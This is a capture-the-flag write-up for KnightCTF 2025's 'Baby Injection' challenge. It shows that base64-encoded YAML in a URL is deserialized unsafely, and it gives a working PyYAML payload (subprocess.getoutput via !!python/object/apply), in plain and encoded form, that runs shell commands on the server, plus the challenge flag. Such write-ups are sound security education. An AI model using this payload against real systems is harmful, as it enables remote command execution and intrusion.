---
title: "Baby Injection - KnightCTF 2025"
category: "misc"
type: "writeup"
tags: ["misc", "base64", "subprocess", "baby", "injection", "knightctf", "knightctf-2025", "2025", "ctf-writeup"]
summary: "If we access the ip in a browser it redirects to a URL"
source:
  name: "CTFtime writeup #39818"
  url: "https://ctftime.org/writeup/39818"
original_source: "https://github.com/Sayed-47/CTF-Writeups/tree/main/Knight-CTF-2025/Web/Baby%20Injection"
ctf:
  name: "KnightCTF 2025"
  year: 2025
  challenge: "Baby Injection"
---

## Metadata

- **CTF:** KnightCTF 2025
- **Task:** Baby Injection
- **Author team:** Not_So_Intelligent
- **CTFtime:** <https://ctftime.org/writeup/39818>
- **Original writeup:** <https://github.com/Sayed-47/CTF-Writeups/tree/main/Knight-CTF-2025/Web/Baby%20Injection>

---
# Challenge Name: Baby Injection

## Description: Sometimes, seemingly harmless configuration files can do more than they appear. Can you uncover a hidden flaw and turn it to your advantage?

## Step 1: Identify the Vulnerability

If we access the ip in a browser it redirects to a URL

```  
http://server-ip:port/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=  
```

![image](<https://github.com/user-attachments/assets/2f518334-da62-4554-badc-70d3c9588158>)

## Step 2: Decode the Base64 Payload

The provided URL contains a Base64-encoded string at the end. Decoding it will give us the content:

**Base64 string:**

```base64  
eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=  
```

**Decoded string:**  
```yaml  
yaml: It's yaml bro, hack me if you can!

```  
If we give "yaml: hello world" in Base64 format after the link we get this

![image](<https://github.com/user-attachments/assets/53e75761-7588-49b6-9827-9cba73897eb0>)

As the website reflects the thing we give, we can give payload to get all contents from the configuration folder

**Payload for listing all the files**

```python  
yaml: !!python/object/apply:subprocess.getoutput ['ls -la']  
```

**Payload in Base64:**

```base64  
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuZ2V0b3V0cHV0IFsnbHMgLWxhJ10=  
```

**Final URL:**

```  
http://server-ip:port/eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuZ2V0b3V0cHV0IFsnbHMgLWxhJ10=  
```

**And we got the flag**

![image](<https://github.com/user-attachments/assets/a0b42e2b-1263-4026-9c82-2a7c53efb8fc>)

```objectivec  
Flag: KCTF{d38787fb0741bd0efdad8ed01f037740}  
```
